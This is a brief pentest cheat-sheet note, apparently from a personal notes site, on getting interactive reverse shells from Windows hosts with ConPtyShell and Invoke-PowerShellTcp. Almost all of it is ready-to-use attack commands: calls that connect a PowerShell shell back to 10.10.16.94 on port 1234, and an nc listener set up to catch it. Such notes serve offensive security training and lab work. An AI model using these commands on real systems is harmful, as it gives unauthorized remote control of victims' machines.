---
publish: true
created: 2026-02-27T15:33:35.822+05:30
modified: 2026-06-22T08:53:03.448+05:30
---

# ConPtyShell

This is the most interactive shell.

add below line to `Invoke-ConPtyShell.ps1` file.

```
Invoke-ConPtyShell -RemoteIp 10.10.16.94 -RemotePort 1234 -Rows 80 -Cols 200 
```

we get shell.

```bash
stty raw -echo; (stty size; cat) | nc -lnvp 1234
```

# Invoke-PowerShellTcp

Add below line to script.

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.94 -Port 1234
```
